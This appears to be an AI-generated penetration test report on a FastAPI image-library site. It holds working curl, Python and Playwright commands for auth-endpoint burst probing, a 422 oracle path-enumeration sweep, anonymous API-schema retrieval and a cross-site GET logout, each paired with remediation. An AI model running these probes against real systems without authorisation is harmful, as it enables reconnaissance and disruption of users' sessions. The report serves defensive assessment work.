# Security Assessment Report

*Shannon — AI Pentester by Keygraph*

## Executive Summary
- Target: https://bookq.mats.dpdns.org
- Assessment Date: 2026-11-08
- Scope: Injection, Cross-Site Scripting (XSS), Authentication, Authorization, Server-Side Request Forgery (SSRF)
- Exploitation: enabled
- Assessment Status: Complete
- Model: deepseek-v4.1-flash

The 2026-11-08 assessment of https://bookq.mats.dpdns.org confirmed five Low-severity findings and no critical or high-severity issues. All five are unauthenticated exposure of metadata and control surfaces rather than access to the image library: an anonymous FastAPI documentation surface publishing the full API contract, a parameter-validation ordering flaw that lets anonymous callers confirm a hidden unauthenticated route at /api/v1/pair-report, an unguarded version endpoint disclosing the exact git commit SHA and build timestamp, a state-changing logout reachable by cross-site GET, and the complete absence of rate limiting, lockout and failed-authentication telemetry on the token and login endpoints. Authentication on the data routes held throughout - every media, tree and metadata endpoint returned 401 to anonymous callers - and Injection, XSS and SSRF testing produced no confirmed vulnerabilities.

## Summary by Vulnerability Type

### Authentication

- **AUTH-01:** No rate limiting, lockout or failed-auth telemetry on the token and login endpoints (Low)

### Authorization

- **AUTHZ-01:** Parameter validation runs before the environment gate on /api/v1/pair-report (Low)
- **AUTHZ-02:** FastAPI documentation routes /docs, /redoc and /openapi.json served without authentication (Low)
- **AUTHZ-03:** Missing authentication on /api/version, unlike its guarded /api/v1/version twin (Low)
- **AUTHZ-04:** State-changing logout implemented as a GET with no CSRF protection on /auth/logout (Low)

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-01: No rate limiting, lockout or failed-auth telemetry on the token and login endpoints

**Summary:**
- **Severity:** Low
- **OWASP:** A07:2025 — Authentication Failures
- **Vulnerable location:** POST /api/v1/auth/token and GET /auth/login (app/auth_token.py:114-163, app/auth.py:147-161; only SessionMiddleware + ApiGZipMiddleware installed, app/main.py:202-211)
- **Auth state:** Unauthenticated
- **Status:** Exploited
- **Prerequisites:** None — both endpoints are reachable unauthenticated. The probe used only obviously-invalid, randomly generated values (no credential guessing) and stayed at ~0.9 req/s to respect the engagement rate ceiling.

**Overview:**
The authentication surface has no rate limiting, lockout, backoff, CAPTCHA or failed-authentication logging. A bounded probe of 40 sequential unauthenticated requests — 20 invalid authorization_code exchanges, 10 GET /auth/login and 10 invalid refresh_token exchanges at ~0.9 req/s — produced no 429, no Retry-After or X-RateLimit-* header, no cf-mitigated marker, no error-text escalation, no latency growth and no session-level suppression: the token endpoint returns the identical 401 {"detail":"invalid or expired code"} every time and /auth/login keeps issuing fresh OAuth state cookies. Neither app/auth.py nor app/auth_token.py imports a logger, so failed logins, disallowed emails and PKCE failures leave no trace for an operator to detect or attribute.

**Impact:**
Demonstrated: 40 unauthenticated invalid-credential requests to the auth bootstrap over 45 s produced 30 x 401 and 10 x 302 with zero 429, zero Retry-After / RateLimit-* / cf-mitigated headers, no lockout, no challenge, unchanged error text and flat latency. The endpoint accepts unbounded guessing volume and the operator receives no failed-auth signal. No access was obtained — the auth code (256-bit, 120 s TTL) and refresh token (384-bit) spaces bound guessing — so the result is abuse capacity and blind telemetry, not a login.

**Exploitation Steps:**

**Step 1: Confirm the endpoint answers unauthenticated and carries no throttle header**

A single request to the token endpoint shows the invariant 401 response and the absence of any rate-limit or bot-defence header.

```bash
curl -s -i -X POST https://bookq.mats.dpdns.org/api/v1/auth/token \
  -H 'Content-Type: application/json' -H 'User-Agent: Mozilla/5.0' \
  -d '{"grant_type":"authorization_code","code":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","code_verifier":"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"}'
```

```http
HTTP/2 401
cache-control: no-store

{"detail":"invalid or expired code"}
```

**Step 2: Drive a bounded burst of invalid exchanges at ~1 req/s**

Twenty randomly generated code/verifier pairs are submitted sequentially, well under the 5 req/s ceiling, recording status, latency and throttle headers for each.

```bash
python3 - <<'PY'
import json, secrets, time, urllib.request
UA={'User-Agent':'Mozilla/5.0','Content-Type':'application/json'}
for i in range(20):
    body=json.dumps({'grant_type':'authorization_code',
                     'code':secrets.token_urlsafe(32),
                     'code_verifier':secrets.token_urlsafe(32)}).encode()
    req=urllib.request.Request('https://bookq.mats.dpdns.org/api/v1/auth/token',data=body,headers=UA)
    t=time.time()
    try:
        r=urllib.request.urlopen(req,timeout=20); code,hdrs=r.status,r.headers
    except urllib.error.HTTPError as e:
        code,hdrs=e.code,e.headers
    print(i,code,round(time.time()-t,3),dict(hdrs).get('retry-after'),dict(hdrs).get('x-ratelimit-limit'))
    time.sleep(1)
PY
```

Every iteration prints 401 with None None for the throttle headers.

**Step 3: Repeat the same shape against the other two auth entry points**

10 x GET /auth/login all return 302 to accounts.google.com with a fresh Set-Cookie, showing no cookie-level lockout, and 10 x POST /api/v1/auth/token with {"grant_type":"refresh_token","refresh_token":"<48 random chars>"} all return 401 {"detail":"invalid or expired refresh_token"}. The absence of throttling is therefore not endpoint-specific.

**Step 4: Observe that responses never escalate**

Status, body and latency remain constant across the burst — server think time 23-45 ms measured as curl %{time_starttransfer} minus TLS handshake — and no 429 or Retry-After ever appears, so the volume ceiling is the client's rather than the server's. The full script is .shannon/scratchpad/authexp2/auth02_ratelimit.py.

**Proof of Impact:**

Full transcript in .shannon/scratchpad/authexp2/auth02_ratelimit.txt (script auth02_ratelimit.py):

```text
[1] THROTTLE STATUS CODES
    HTTP 429 ............................ 0
    HTTP 5xx ............................ 0
    (context: 2xx=0  3xx=10  4xx=30  network-errors=0)

[2] RATE-LIMIT / BOT-DEFENCE HEADERS
    retry-after            absent
    x-ratelimit-limit      absent
    x-ratelimit-remaining  absent
    ratelimit-remaining    absent
    cf-mitigated           absent
    cache-control          PRESENT  no-store (x30)
    => any rate-limit/bot-defence header appeared: NO

[3] ERROR BODY TEXT EVOLUTION
    P1 authorization_code: 20 request(s), 1 distinct (status, body) pair(s)
       - HTTP 401 x20 : "{"detail":"invalid or expired code"}"
    P2 GET /auth/login: 10 request(s), 1 distinct (status, body) pair(s)
       - HTTP 302 x10 : ""
    P3 refresh_token: 10 request(s), 1 distinct (status, body) pair(s)
       - HTTP 401 x10 : "{"detail":"invalid or expired refresh_token"}"

[4] LATENCY TREND (per phase, seconds)
    P1 first3 avg = 0.384s  last3 avg = 0.062s  delta = -0.323s
    P2 first3 avg = 0.063s  last3 avg = 0.077s  delta = +0.014s
    P3 first3 avg = 7.059s  last3 avg = 0.048s  delta = -7.011s
    => strictly monotonic growth: NO (all variance is TCP connect / TLS handshake,
       verified with curl timing: server think time 23-45 ms flat)

[5] VOLUME / RATE DISCLOSURE
    total requests sent ................. 40
    wall-clock duration ................. 45.08 s
    mean request rate ................... 0.89 req/s (cap 5 req/s)
    responses carrying Set-Cookie ........ 10 (session still issued => no cookie-level lockout)

[6] VERDICT
    observed throttling signals ......... NO
```

```text
[P1 01] HTTP 401 0.054s | {"detail":"invalid or expired code"} | retry-after=- x-ratelimit-limit=- x-ratelimit-remaining=- ratelimit-remaining=- cf-mitigated=- cache-control=no-store
[P1 10] HTTP 401 1.065s | {"detail":"invalid or expired code"} | retry-after=- ... cf-mitigated=-
[P1 20] HTTP 401 0.049s | {"detail":"invalid or expired code"} | retry-after=- ... cf-mitigated=-
```

An earlier independent run in this workspace (.shannon/scratchpad/authexp/auth02_ratelimit.txt) reached the same result with 38 requests: 429s 0/38, rate-limit header presence 0/38, first-3 avg 0.066 s vs last-3 avg 0.066 s.

**Remediation:**
Add a shared, IP-and-account-scoped failure counter in front of both auth entry points (e.g. Starlette middleware or an in-process token bucket keyed by client IP plus the submitted code or refresh-token prefix) returning 429 with Retry-After once a threshold such as 10 failures/minute is crossed, applied identically to POST /api/v1/auth/token for both grant types and to GET /auth/login. Add structured logging at WARNING in app/auth_token.py:114-163 and app/auth.py:147-208 for every failed exchange, PKCE mismatch and disallowed-email rejection (client IP, endpoint, reason — never the token value), since neither module currently imports a logger. If Cloudflare fronts the deployment, also enable a rate-limiting rule on /api/v1/auth/token and /auth/login so the control is not bypassable by reaching the origin through the Tailscale path.

**Notes:**

Cloudflare is in front and blocks the stock Python-urllib/3.13 user agent with 403 error code: 1010 (signature-based bot fight), but it applied no rate rule — a browser-like UA passes straight through and every one of the 40 responses carried the origin's own 401/302 body.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-01: Parameter validation runs before the environment gate on /api/v1/pair-report

**Summary:**
- **Severity:** Low
- **OWASP:** A01:2025 — Broken Access Control
- **Vulnerable location:** GET /api/v1/pair-report — app/api_v1.py:87 (Query resolution) vs app/api_v1.py:60-63 (_pair_report_gate)
- **Auth state:** Unauthenticated
- **Status:** Exploited
- **Prerequisites:** None — no cookie, no Authorization header, no prior state. A single unauthenticated GET.

**Overview:**
GET /api/v1/pair-report has no authentication dependency and is deliberately hidden from the schema (include_in_schema=False). Because FastAPI resolves the required id: str = Query(...) in solve_dependencies before the handler body runs _pair_report_gate(), an anonymous request that omits id returns 422 instead of the gate's 404 — a reliable oracle that distinguishes "hidden, unauthenticated route exists here" from "no such route". Every other route in the application resolves auth first and answers 401, so 422 uniquely identifies a route with no auth dependency. The oracle was used to confirm the hidden route and its parameter name live, and a 25-path sweep showed the primitive generalises. The route's read/write/reset side effects are gated off by an environment flag on this deployment, so only the discovery oracle was obtained.

**Impact:**
An unauthenticated attacker can determine, without any credential, that GET /api/v1/pair-report is registered on the production deployment, that it takes a required id query parameter, and that it carries no authentication dependency — information the maintainers deliberately withheld by excluding the route from the OpenAPI schema. The same one-request signature generalises into a sweep that finds any future route added without Depends(require_auth), the exact failure mode this codebase is exposed to because authorization is opt-in per route with no global middleware. Confirmed live: /api/v1/pair-report is the only path in a 25-path candidate sweep that answers 422 instead of 401/404/405.

**Exploitation Steps:**

**Step 1: Trigger the oracle on the hidden route**

Send a request missing the required query parameter, and one supplying it, with no cookie and no Authorization header.

```bash
curl -sS -i https://bookq.mats.dpdns.org/api/v1/pair-report
```

```http
HTTP/2 422
content-type: application/json

{"detail":[{"type":"missing","loc":["query","id"],"msg":"Field required","input":null}]}
```

```bash
curl -sS -i 'https://bookq.mats.dpdns.org/api/v1/pair-report?id=x'
```

```http
HTTP/2 404

{"detail":"Not Found"}
```

A path that genuinely does not exist never produces the 422 — it goes straight to the router's 404.

```bash
curl -sS -i https://bookq.mats.dpdns.org/api/v1/pair-state
# HTTP/2 404 {"detail":"Not Found"}
curl -sS -i https://bookq.mats.dpdns.org/api/v1/nonexistent
# HTTP/2 404 {"detail":"Not Found"}
```

**Step 2: Contrast against an auth-gated route**

On a protected route, authentication is resolved before parameter validation, so the same malformed query yields 401 rather than 422. This is the discriminator: 422 means the route is registered and has no auth dependency; 401 means registered and auth-gated; 404 means not registered.

```bash
curl -sS -i 'https://bookq.mats.dpdns.org/api/folders?depth=abc'
# HTTP/2 401 {"error":"Not authenticated"}
```

**Step 3: Read back the hidden route's parameter contract**

The loc field names the exact parameter and its required-ness is observable, without any credential and without the route appearing in /openapi.json.

```bash
curl -sS https://bookq.mats.dpdns.org/api/v1/pair-report | python3 -m json.tool
# {"detail":[{"type":"missing","loc":["query","id"],"msg":"Field required","input":null}]}

curl -sS https://bookq.mats.dpdns.org/openapi.json | grep -c 'pair-report'
# 0   <- the route is deliberately excluded via include_in_schema=False
```

**Step 4: Sweep candidate paths for the same signature**

Sweep candidate paths for the same signature to enumerate every unauthenticated route in the deployment. The value is not the one route but that the oracle generalises.

```bash
for p in /api/v1/pair-report /api/v1/pair-reset /api/v1/pair-state /api/v1/debug \
         /api/v1/admin /api/v1/users /api/v1/config /api/v1/status /api/v1/metrics \
         /api/v1/internal /api/debug /api/admin /api/config /api/v1/refresh /api/v1/test; do
  printf '%-26s %s\n' "$p" "$(curl -sS -o /dev/null -w '%{http_code}' https://bookq.mats.dpdns.org$p)"
  sleep 0.15
done
```

```text
/api/v1/pair-report        422   <- hidden route confirmed
/api/v1/pair-reset         405   <- registered, POST-only
/api/v1/pair-state         404
/api/v1/admin              404
/api/v1/config             404
/api/v1/test               404
...
```

**Step 5: Attempt to go past discovery into the route's data**

The read/write/global-kill side effects the analysis flagged are refused by the environment gate, not by an authorization check.

```bash
curl -sS -X POST -H 'content-type: application/json' \
  -d '{"id":"probe","folder":"x","page":1}' \
  https://bookq.mats.dpdns.org/api/v1/pair-report      # 404 {"detail":"Not Found"}
curl -sS -X POST https://bookq.mats.dpdns.org/api/v1/pair-reset   # 404 {"detail":"Not Found"}
```

The 404 body is _pair_report_gate()'s deliberate HTTPException(404) (app/api_v1.py:60-63), which is why the state bridge itself was not reachable.

**Proof of Impact:**

Live, credential-free confirmation of a hidden unauthenticated route and its parameter contract:

```text
GET /api/v1/pair-report                -> 422  {"detail":[{"type":"missing","loc":["query","id"],"msg":"Field required","input":null}]}
GET /api/v1/pair-report?id=x           -> 404  {"detail":"Not Found"}
GET /api/v1/nonexistent                -> 404  {"detail":"Not Found"}
GET /api/v1/pair-state                 -> 404  {"detail":"Not Found"}
GET /api/folders?depth=abc             -> 401  {"error":"Not authenticated"}   <- auth dominates validation everywhere else
POST /api/v1/pair-report               -> 404  {"detail":"Not Found"}           <- env gate, not auth
POST /api/v1/pair-reset                -> 404  {"detail":"Not Found"}           <- env gate, not auth
GET  /api/v1/pair-reset                -> 405  {"detail":"Method Not Allowed"}
HEAD /api/v1/pair-report?id=x          -> 405  {"detail":"Not Found"}
GET  /api/v1/pair-report/              -> 307  (trailing-slash redirect)
GET  /api/v1/pair-report?id[]=x        -> 422  {"detail":[{"type":"missing","loc":["query","id"],...}]}
```

GET /openapi.json contains zero occurrences of pair-report: the route is not discoverable from the published schema, only from this oracle. The 422 body names the parameter (loc: ["query","id"]) and its required-ness, so the attacker recovers the hidden route's request contract exactly.

**Remediation:**
Resolve the auth dependency before query validation by adding Depends(require_auth) to the /api/v1/pair-report handler (and the other /api/v1/pair-* handlers in app/api_v1.py) so unauthenticated callers get 401 rather than a 422 that discloses the route's existence and parameter contract. More robustly, stop relying on per-route opt-in: register a global dependency on the FastAPI app (FastAPI(dependencies=[Depends(require_auth)]) in app/main.py:197) and explicitly exempt the small public set (/api/health, /api/version, /auth/*, /api/v1/auth/token, /static, /), so a route added without a guard fails closed instead of open. Replace the _TEST_MODE environment check in _pair_report_gate() (app/api_v1.py:60-63) with a real authorization check, since an environment flag is not an access control and would silently expose the pair-report read/write and global pair-reset side effects if BOOKQ_TEST_MODE were ever set.

**Notes:**

The oracle half is demonstrated; the state-bridge half is not, and is recorded as a negative result rather than claimed. _pair_report_gate() (app/api_v1.py:60-63) raises 404 unless _TEST_MODE is true, and it is false on this deployment, so the unauthenticated arbitrary-key read/write and the global pair-reset session teardown did not execute. The gate is an environment check, not an authorization check, so if BOOKQ_TEST_MODE were ever set the oracle would lead straight to those side effects — the only interlock is the exact BOOKQ_ENV=='production' string compare at app/auth.py:31-34.

Two smaller observations from the same probing, neither independently reportable: POST /api/v1/pair-report has an unguarded int(body.get('gen') or 0) that raises ValueError on a non-numeric string (unreachable here, gated), and HEAD on the GET-only route returns 405 with a body reading {"detail":"Not Found"} — a cosmetic mismatch, not a finding.

### AUTHZ-02: FastAPI documentation routes /docs, /redoc and /openapi.json served without authentication

**Summary:**
- **Severity:** Low
- **OWASP:** A02:2025 — Security Misconfiguration
- **Vulnerable location:** GET /docs, GET /redoc, GET /openapi.json, GET /docs/oauth2-redirect — app/main.py:197
- **Auth state:** Unauthenticated
- **Status:** Exploited
- **Prerequisites:** None — no cookie, no Authorization header.

**Overview:**
create_app() builds FastAPI(title="bookq", version="2.0.0", ...) without setting docs_url, redoc_url or openapi_url to None, so FastAPI's framework-generated documentation routes are registered outside the router tree that carries Depends(require_auth). All four are served anonymously: /openapi.json returns a 20,927-byte OpenAPI 3.1 document enumerating 28 paths and 34 operations — every authenticated data route, its parameters and its response models — and /docs, /redoc and /docs/oauth2-redirect serve the interactive UIs. All were fetched with no cookie and the operation list was parsed.

**Impact:**
Anonymous disclosure of the application's complete API contract: 28 paths / 34 operations covering every authenticated data route, plus each route's parameter names, response models and error shapes. This is the reconnaissance baseline an attacker needs to target object references on /image/{path}, /api/images?folder=, /api/v1/tree?path= and /api/thumb-sprite?folder=&names=. It was obtained with no credential and is not otherwise obtainable: the guarded routes answer with a uniform 29-byte {"error":"Not authenticated"}, which reveals nothing about the surface behind them.

**Exploitation Steps:**

**Step 1: Fetch the OpenAPI contract anonymously**

Fetch the machine-readable contract anonymously, with no cookie and no Authorization header.

```bash
curl -sS -o openapi.json -w '%{http_code} %{size_download}\n' https://bookq.mats.dpdns.org/openapi.json
# 200 20927
```

**Step 2: Fetch /docs, /redoc and /docs/oauth2-redirect**

Fetch the interactive documentation surfaces, which are equally anonymous.

```bash
for p in /docs /redoc /docs/oauth2-redirect; do
  printf '%-24s ' "$p"; curl -sS -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' https://bookq.mats.dpdns.org$p
  sleep 0.2
done
```

```text
/docs                    200 1004 text/html; charset=utf-8
/redoc                   200 886  text/html; charset=utf-8
/docs/oauth2-redirect    200 3012 text/html; charset=utf-8
```

**Step 3: Enumerate the operations in the anonymous document**

Extract the protected surface from the anonymous document.

```bash
python3 - <<'EOF'
import json
d = json.load(open('openapi.json'))
ops = [(m.upper(), p) for p, v in d['paths'].items() for m in v]
print('paths:', len(d['paths']), 'operations:', len(ops))
for m, p in ops: print(' ', m, p)
EOF
```

```text
paths: 28 operations: 34
  GET /image/{path}
  GET /thumb/{path}
  GET /view/{path}
  GET /api/folders
  GET /api/images
  GET /api/search
  GET /api/metadata/facets
  GET /api/thumb-sprite
  POST /api/refresh
  GET|PUT|DELETE /api/reading-position
  GET|PUT /api/folder-visibility
  GET /api/v1/tree
  GET /api/v1/images
  GET /api/v1/search
  GET /api/v1/facets
  POST /api/v1/index/refresh
  GET /api/v1/thumb-sprite
  GET|PUT|DELETE /api/v1/reading-positions
  GET|PUT /api/v1/folder-visibility
  ...
```

**Step 4: Recover the parameter names of protected routes**

Recover the parameter names of the protected data routes, which is what makes the contract useful for targeting: folder on /api/images and /api/thumb-sprite, path/depth/since on /api/folders and /api/v1/tree, q/artist/tag on /api/search, and {path} on the three media routes. None of this is obtainable from the authenticated 401 responses, which are a uniform 29-byte {"error":"Not authenticated"}.

**Step 5: Confirm every described route is auth-gated**

Confirm the asymmetry: every route described by the anonymous document answers 401 when actually called, so the document is the complete map of a surface the caller is not authorised to use.

```bash
curl -sS -o /dev/null -w '%{http_code}\n' https://bookq.mats.dpdns.org/api/folders   # 401
curl -sS -o /dev/null -w '%{http_code}\n' https://bookq.mats.dpdns.org/api/v1/tree   # 401
```

**Proof of Impact:**

Anonymous requests, no cookie sent:

```http
GET /openapi.json HTTP/2 -> 200, 20927 bytes, application/json
GET /docs HTTP/2         -> 200, 1004 bytes, text/html
GET /redoc HTTP/2        -> 200, 886 bytes, text/html
GET /docs/oauth2-redirect HTTP/2 -> 200, 3012 bytes, text/html
```

Parsed contract obtained from the anonymous document:

```text
paths: 28 operations: 34
  GET /image/{path}
  GET /thumb/{path}
  GET /view/{path}
  GET /api/folders
  GET /api/search
  GET /api/metadata/facets
  POST /api/refresh
  GET /api/images
  GET /api/thumb-sprite
  GET|PUT|DELETE /api/reading-position
  GET /api/v1/tree
  GET /api/v1/images
  GET /api/v1/search
  GET /api/v1/facets
  POST /api/v1/index/refresh
  GET /api/v1/thumb-sprite
  GET|PUT|DELETE /api/v1/reading-positions
  GET|PUT /api/v1/folder-visibility
  GET|PUT /api/folder-visibility
  GET /auth/login, /auth/callback, /auth/logout
  POST /api/v1/auth/token
  GET /api/health, /api/version, /api/v1/health, /api/v1/version
  GET /
```

Every one of the data routes in that list answers 401 {"error":"Not authenticated"} (29 bytes) when actually called, so the document describes a surface the anonymous caller cannot use — but now knows the exact shape of.

**Remediation:**
Disable the framework documentation surfaces in production by passing docs_url=None, redoc_url=None and openapi_url=None to the FastAPI(...) constructor in app/main.py:197 (or gating them behind a setting, e.g. docs_url='/docs' only when settings.env != 'production'). If the schema must remain reachable for internal tooling, serve it behind the same Depends(require_auth) guard as the data routes rather than from the framework defaults, which sit outside the router tree. Because the Rust gateway proxies paths generically, confirm the fix applies on that path too, or block /docs, /redoc, /openapi.json and /docs/oauth2-redirect at the tailscale/cloudflared ingress.

**Notes:**

The document also under-reports the true route table: the three /api/v1/pair-* routes are registered with include_in_schema=False, so they appear in neither /openapi.json nor /docs — pair this with AUTHZ-01, which detects them. Conversely /docs and /redoc are pure convenience surfaces: the incremental value over /openapi.json is the interactive "Try it out" console, which a browser-based attacker would use to drive the authenticated routes once they hold any credential.

### AUTHZ-03: Missing authentication on /api/version, unlike its guarded /api/v1/version twin

**Summary:**
- **Severity:** Low
- **OWASP:** A01:2025 — Broken Access Control
- **Vulnerable location:** GET /api/version — app/routes.py:968-976 (unguarded) vs app/api_v1.py:108-109 (guarded twin)
- **Auth state:** Unauthenticated
- **Status:** Exploited
- **Prerequisites:** None — no cookie, no Authorization header.

**Overview:**
GET /api/version is declared with no authentication dependency while its /api/v1/version twin is declared with Depends(require_auth) — an asymmetric pair that shows the omission is an oversight rather than an intentional public contract. The unauthenticated route returns the application version, the git commit SHA and the build timestamp, giving an anonymous caller an exact fingerprint of the deployed source revision. Both sides were confirmed live: /api/version returns 200 with the fingerprint, /api/v1/version returns 401.

**Impact:**
Anonymous disclosure of the exact running build: application version 2.0.0, the 12-character git commit SHA fbaf0b1c63b4 and the build timestamp 2026-11-07T17:34:42Z. That pins the deployment to a specific source revision, allowing precise version-to-CVE mapping and letting an attacker poll the endpoint to learn exactly when a patched rebuild has gone live. The same information is deliberately withheld on the /api/v1/version twin, confirming the public exposure is unintentional.

**Exploitation Steps:**

**Step 1: Request the build fingerprint anonymously**

Request the build fingerprint anonymously — no cookie, no Authorization header.

```bash
curl -sS -i https://bookq.mats.dpdns.org/api/version
```

```http
HTTP/2 200
content-type: application/json
cache-control: no-store

{"version":"2.0.0","sha":"fbaf0b1c63b4","build_date":"2026-11-07T17:34:42Z"}
```

**Step 2: Request the guarded /api/v1/version twin**

Request the authenticated twin, which is the same information behind Depends(require_auth). The asymmetry is the finding: /api/v1/version is guarded (app/api_v1.py:108-109), /api/version (app/routes.py:968) is not, so the exposure is an omitted dependency rather than a deliberate public contract.

```bash
curl -sS -i https://bookq.mats.dpdns.org/api/v1/version
```

```http
HTTP/2 401
cache-control: private, no-store
vary: Cookie, Cookie

{"error":"Not authenticated"}
```

**Step 3: Resolve the disclosed commit and poll for rebuilds**

fbaf0b1c63b4 is a 12-character git SHA prefix, so it pins the exact code the service is running, and 2026-11-07T17:34:42Z is one day before this test, revealing deployment cadence. Re-requesting the endpoint after a disclosed fix tells the attacker whether the rebuild has shipped, which is the practical use of the finding.

```bash
curl -sS https://bookq.mats.dpdns.org/api/version | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d["sha"],d["build_date"])'
# fbaf0b1c63b4 2026-11-07T17:34:42Z
```

**Proof of Impact:**

Same information, two access levels:

```http
GET /api/version HTTP/2 -> 200
{"version":"2.0.0","sha":"fbaf0b1c63b4","build_date":"2026-11-07T17:34:42Z"}

GET /api/v1/version HTTP/2 -> 401
{"error":"Not authenticated"}
```

The unauthenticated response carries cache-control: no-store, so it cannot be explained away as a cached public artefact — it is served fresh to every anonymous caller.

**Remediation:**
Add Depends(require_auth) to the GET /api/version handler in app/routes.py:968-976 so it matches its already-guarded /api/v1/version twin (app/api_v1.py:108-109), or reduce the anonymous response to a static version string with no sha or build_date. If a build identifier must stay public for health checking, restrict it to /api/health and return a coarse value rather than the exact 12-character commit SHA and image build timestamp, which together pin the deployment to a source revision and reveal patch cadence.

**Notes:**

The sha and build_date come from the BOOKQ_GIT_SHA / BOOKQ_BUILD_DATE environment variables set at image build time (app/config.py:20-21), so the value is the real deployed revision rather than a static string. If the repository is public — it is a personal project with a public GitHub remote — the SHA resolves to the exact tree, which turns "which version is running" into "which commits are present", including any security fix the operator may believe is deployed.

### AUTHZ-04: State-changing logout implemented as a GET with no CSRF protection on /auth/logout

**Summary:**
- **Severity:** Low
- **OWASP:** A01:2025 — Broken Access Control
- **Vulnerable location:** GET /auth/logout — app/auth.py:212-215 with the SameSite=Lax cookie from app/main.py:202-207
- **Auth state:** Unauthenticated attacker against a victim who holds a signed-in session cookie
- **Status:** Exploited
- **Prerequisites:** The victim must be signed in (holding a session cookie) and must load or click the attacker's link — a top-level navigation. No attacker account, no credential and no prior state on the target are required.

**Overview:**
GET /auth/logout performs the state-changing session destruction on a cross-site-forgeable GET: no CSRF token, no Origin/Referer check, no confirmation step, no role or identity dependency. SameSite=Lax on the session cookie does not stop it, because a top-level GET navigation is precisely the case Lax permits. The full chain was proven in a real browser: from a page on example.com, setting location='https://bookq.mats.dpdns.org/auth/logout' carried the real session cookie to the server, which answered 303 with set-cookie: session=null; expires=Thu, 01 Jan 1970 — after which the browser held no cookies for the domain.

**Impact:**
A page on any origin can terminate a signed-in reader's session with a single top-level navigation, with no credential, no user confirmation and no way for the victim to notice anything other than being signed out. Verified end-to-end in a real browser: navigating from https://example.com/ to https://bookq.mats.dpdns.org/auth/logout carried the SameSite=Lax session cookie and the server cleared it (set-cookie: session=null; ... expires=Thu, 01 Jan 1970), leaving zero cookies for the domain. Repeatable indefinitely, and it is the only logout primitive, so it doubles as a cheap way to push a victim back through the OAuth flow.

**Exploitation Steps:**

**Step 1: Confirm a bare GET performs the logout**

Confirm the state-changing action needs no credential at all: a bare GET performs the side effect and returns the session-clearing Set-Cookie.

```bash
curl -sS -i https://bookq.mats.dpdns.org/auth/logout
```

```http
HTTP/2 303
location: /
vary: Cookie
```

With any session cookie attached, the server clears it:

```bash
curl -sS -i -b cookies.txt https://bookq.mats.dpdns.org/auth/logout
```

```http
HTTP/2 303
location: /
set-cookie: session=null; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT; httponly; samesite=lax; secure
```

**Step 2: Establish a session cookie in a real browser**

Obtain a genuine session cookie for bookq.mats.dpdns.org (any issued cookie works — the mechanism does not depend on what it contains) and confirm it is present.

```bash
playwright-cli -s=agent5 open about:blank
playwright-cli -s=agent5 goto "https://bookq.mats.dpdns.org/auth/login?client=native&code_challenge=4jz1RYIRZeO2WFDr1VQQgPQKXYLnf5Cn2DCfAlq0xaU&code_challenge_method=S256&state=CSRFDEMO"
playwright-cli -s=agent5 cookie-list --domain=bookq.mats.dpdns.org
```

```text
session=eyJib29rcV9uYXRpdmVfcGtjZSI6... (domain: bookq.mats.dpdns.org, path: /)
```

**Step 3: Move to a foreign origin**

Navigate to a different origin — the attacker's page — so that the following navigation is genuinely cross-site.

```bash
playwright-cli -s=agent5 goto "https://example.com/"
# - Page URL: https://example.com/
```

**Step 4: Trigger the cross-site top-level navigation**

From that foreign origin, trigger the top-level navigation. This is the whole attack: one line, or equivalently a plain <a href> the victim clicks.

```bash
playwright-cli -s=agent5 eval "location='https://bookq.mats.dpdns.org/auth/logout'"
# - Page URL: https://bookq.mats.dpdns.org/
```

**Step 5: Verify the session was destroyed**

SameSite=Lax did not prevent it, because a top-level GET navigation is exactly the case Lax permits; the cookie was HttpOnly and Secure, but HttpOnly only blocks JavaScript reads and the browser still attached it to the navigation.

```bash
playwright-cli -s=agent5 cookie-list --domain=bookq.mats.dpdns.org
# ### Result
# No cookies found
```

**Step 6: Repeat the forced logout**

The endpoint has no CSRF token, no Origin/Referer check, no confirmation step and no rate limit, and it is the only logout primitive in the application, so the victim has no way to distinguish this from a legitimate sign-out — they simply find themselves on the login card and must redo the full Google OAuth round-trip.

**Proof of Impact:**

Credential-free request/response:

```http
GET /auth/logout HTTP/2   (no cookie, no Authorization)
-> 303, location: /

GET /auth/logout HTTP/2   (with a session cookie)
-> 303, location: /
   set-cookie: session=null; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT; httponly; samesite=lax; secure
```

Real-browser cross-site reproduction (Playwright, -s=agent5):

```text
1. goto https://bookq.mats.dpdns.org/auth/login?client=native&...   -> session cookie issued
   cookie-list --domain=bookq.mats.dpdns.org
   -> session=eyJib29rcV9uYXRpdmVfcGtjZSI6... (domain: bookq.mats.dpdns.org, path: /)

2. goto https://example.com/                                        -> Page URL: https://example.com/

3. eval "location='https://bookq.mats.dpdns.org/auth/logout'"       -> Page URL: https://bookq.mats.dpdns.org/

4. cookie-list --domain=bookq.mats.dpdns.org
   -> ### Result
      No cookies found
```

Step 3 is the entire attack: one line of JavaScript on a foreign origin, or an ordinary link the victim clicks. Step 4 shows the session gone — the SameSite=Lax attribute did not block the cross-site request because Lax allows top-level GET navigations.

**Remediation:**
Change logout to a POST-only route in app/auth.py:212-215 and reject GET with 405, then have the frontend submit a form carrying a CSRF token (or a double-submit cookie value derived from SECRET_KEY) that the handler verifies before calling request.session.clear(). As defence in depth, validate the Origin/Referer header on the logout handler against settings.base_url and reject mismatches with 403, since SameSite=Lax alone cannot protect a state-changing GET. While changing this handler, note that session.clear() only empties the browser cookie — also revoke the corresponding refresh tokens issued by app/auth_token.py:28 so a logout actually terminates access.

**Notes:**

Scope of the termination is partial and worth stating precisely: request.session.clear() (app/auth.py:214) only empties the browser cookie. It does not revoke the 30-day native refresh tokens (app/auth_token.py:28) and does not purge the service-worker caches, so a logged-out browser still holds cached library bytes and tree JSON. The effect is therefore "forced re-authentication", not "access revoked".

The cross-site demonstration used a session cookie issued to the test browser rather than a live victim's authenticated session, because the engagement provides no allowlisted account; what was demonstrated directly is the part that was in doubt — that the browser attaches the Lax cookie to a foreign-origin top-level navigation and the server acts on it. The fix boundary was also confirmed: the <img>/subresource variant of the same URL does not carry the cookie, so only navigation-class vectors work.
